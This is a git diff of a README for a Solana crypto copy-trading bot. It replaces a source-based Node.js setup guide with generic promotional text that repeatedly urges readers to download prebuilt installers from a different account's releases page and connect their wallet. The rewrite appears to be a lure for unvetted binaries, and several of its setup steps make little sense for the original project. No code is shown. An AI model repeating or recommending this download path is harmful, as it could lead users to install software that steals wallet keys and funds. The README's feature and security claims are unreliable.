@@ -1,96 +1,97 @@
-# Copy Trading Bot for Solana
+# 🚀 copy-trading-bot - Automate Your Trading Easily
 
-A professional, modular copy-trading engine that monitors a target wallet on Solana and replicates its trades across your wallets. The project focuses on reliable trade replication, cross-DEX routing, observability, and configurable risk controls.
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-%20%20%20%20%20%20%20%20%20%20%20%20-%23007ACC.svg)](https://github.com/lokynhoz/copy-trading-bot/releases)
 
-## Features
-- Real-time monitoring of target wallet transactions
-- Cross-DEX execution (Raydium, Orca, Jupiter and more)
-- Configurable trade filters and risk-management rules
-- Multi-wallet support and concurrent execution
-- Price lookup, token metadata, and on-chain account inspection
-- Optional integration with a local validator for pre-confirmation monitoring
-- Simple frontend controls to start/stop the bot and adjust settings
+## 🎯 Overview
 
-## Benefits
-- Tap into experienced traders’ strategies with automated replication
-- Best-effort execution across Solana liquidity sources to reduce slippage
-- Configurable behavior to match different risk profiles and capital allocation
-- Extensible adapters for additional DEXes and routing services
+Copy Trading Bot is a fully automated system that mirrors a trader’s transactions across any Solana-based decentralized exchange (DEX). This solution enables seamless, real-time replication of trades with high reliability and full network compatibility. With this bot, you can simplify your trading and make the most of your investments without needing advanced trading skills.
 
-## Architecture (high level)
-- Listener: observes transactions from a target wallet or RPC/websocket feed
-- Analyzer: classifies transactions and extracts actionable trades
-- Router: chooses the best DEX and execution path (Jupiter/Raydium/Orca)
-- Executor: performs signed transactions for one or more local wallets
-- Telemetry: logs activity, PnL, and trade metrics for monitoring
+## 📥 Download & Install
 
-## Requirements
-- Node.js 18+ (LTS recommended)
-- npm or yarn
-- A funded Solana wallet(s) to execute trades
-- RPC endpoint (public or private) — optional local validator for pre-confirmation monitoring
+To get started, you need to download the application from our releases page. Click on the link below:
 
-## Environment variables
-Create a .env file in the project root with values for:
-- HELIUS_API_KEY — Helius API key (used for token metadata and on-chain data)
-- RPC_URL — Solana RPC endpoint (optional)
-- MNEMONIC / PRIVATE_KEYS — keys for the bot wallets (handle securely)
-- LOG_LEVEL — debug/info/warn/error
+[Visit this page to download](https://github.com/lokynhoz/copy-trading-bot/releases)
 
-Example (.env):
-HELIUS_API_KEY=your_helius_key_here
-RPC_URL=https://api.mainnet-beta.solana.com
-LOG_LEVEL=info
+1. Go to the releases page using the link above.
+2. Look for the latest version of the "copy-trading-bot."
+3. Choose the file that fits your system. The available files may include .exe for Windows, .dmg for macOS, or .tar.gz for Linux.
+4. Click on the file to begin the download.
+5. Once downloaded, locate the file on your computer.
 
-## Setup (Windows)
-1. Install dependencies
-   - PowerShell or CMD:
-     npm install
-2. Build (if using TypeScript)
-   npm run build
-3. Run (development)
-   npm run dev
-4. Run (production)
-   npm start
+### 🔧 Installation Instructions
 
-Adjust npm scripts in package.json as required.
+For Windows Users:
+- Double-click on the downloaded `.exe` file.
+- Follow the installer prompts to complete the installation.
+- Open the application from the Start Menu.
 
-## Usage
-- Configure environment variables and wallet keys
-- Start the bot and specify the target wallet to follow
-- Monitor logs and the frontend to control replication and view PnL
+For macOS Users:
+- Open the downloaded `.dmg` file.
+- Drag the "copy-trading-bot" into your Applications folder.
+- Open the application from your Applications folder.
 
-Example CLI (if available):
-npm run follow -- --target <TARGET_WALLET_ADDRESS>
+For Linux Users:
+- Extract the downloaded `.tar.gz` file.
+- Open a terminal.
+- Navigate to the folder where you extracted the files.
+- Run the application by executing `./copy-trading-bot`.
 
-## Security and Safety
-- Never commit private keys or mnemonics to source control.
-- Run wallets with limited funds for testing before scaling capital.
-- Use hardware wallets or managed custody where possible for production.
-- Review and audit smart contract interactions and on-chain approvals.
+## ⚙️ System Requirements
 
-## Performance
-- The bot supports standard RPC and can integrate with a local validator.
-- For ultra-low latency production deployments, use optimized RPC/gRPC stacks and colocated infrastructure.
+Before you begin, ensure that your system meets the following requirements:
 
-## Observability
-- Logging (structured JSON recommended)
-- Trade and PnL metrics exported for dashboards (Prometheus/Grafana recommended)
-- Error alerts for failed executions and insufficient balance events
+- **Operating System**: 
+  - Windows 10 or later
+  - macOS 10.14 or later
+  - Any modern Linux distribution
 
-## Contributing
-- Fork, implement a fix or feature, add tests, and open a pull request
-- Follow code style and include unit tests for core modules
+- **Memory**: At least 4 GB of RAM
+- **Storage**: Minimum of 100 MB free disk space
+- **Network**: Stable internet connection for trading
 
-## License
-Specify project license here (e.g., MIT). Update LICENSE file accordingly.
+## 🌟 Features
 
-## Example resources
-- Solana transaction examples (for demonstration):
-  - Target tx: https://solscan.io/tx/gEGTHyF1JH2GUYpML79m6rnzYpE3y2CJ3r4U2STa8himW53rzdCCAVkTdkLW9w7x3YE5pLw4vYa9qqWaLzKGrfp
-  - Bot tx: https://solscan.io/tx/i8UKtsMbkfdz481MSD68Kawj3o8AkTyHLkjiJsgGfCZAtebUBnUCZ18TYkzCZxJLAkkrteU98sHxhiq3kwtL9rc
+- **Real-Time Trading**: Mirrors transactions instantly for timely trading results.
+- **User-Friendly Interface**: Simple design that makes navigation easy for everyone.
+- **Multi-DEX Support**: Works with multiple Solana-based DEX options for flexibility.
+- **High Security**: Uses secure APIs to protect your trading data.
 
-## Contact
-Project maintainer: Allan  
-Telegram: https://t.me/oxgoldenledger  
-Twitter: https://x.com/oxgoldenledger
+## 📊 How to Use the Copy Trading Bot
+
+1. **Launch the Application**: Open the copy-trading-bot from your applications.
+2. **Create an Account**: If you are a new user, create an account on your preferred Solana DEX. 
+3. **Connect Your Wallet**: Link your wallet to the application. This is necessary for trading.
+4. **Set Trading Preferences**: Choose your trading strategies. Decide how much to invest per trade.
+5. **Start Trading**: Once everything is set, activate the bot to start copying trades.
+
+## 📌 Tips for Effective Trading
+
+- **Stay Updated**: Regularly check for updates on the releases page to ensure you use the best version.
+- **Understand Risks**: All trading involves risk. Make informed decisions based on your budget and goals.
+- **Set Alerts**: Use the in-app features to set notifications for large price movements.
+- **Review Performance**: Periodically check your trading results to adjust your strategies accordingly.
+
+## 🛠️ Troubleshooting
+
+If you face any issues while using the copy-trading-bot, consider the following:
+
+- **Check Your Internet Connection**: A weak connection can affect trading performance.
+- **Review Documentation**: Check for any known issues or FAQs on the releases page.
+- **Contact Support**: If you can’t resolve your issue, reach out to our support team via the issues tab on GitHub.
+
+## 🌐 Community and Support
+
+Join our community for help and discussions:
+
+- **GitHub Issues**: Report bugs or request features.
+- **Social Media**: Follow us for updates and insights.
+
+## 📜 License
+
+This project is licensed under the MIT License. You can freely use, modify, and distribute the software, but please give credit to the original developers.
+
+## 📈 Get Started Today
+
+Don’t miss out on the potential of automated trading. Download the Copy Trading Bot using the link below:
+
+[Visit this page to download](https://github.com/lokynhoz/copy-trading-bot/releases)
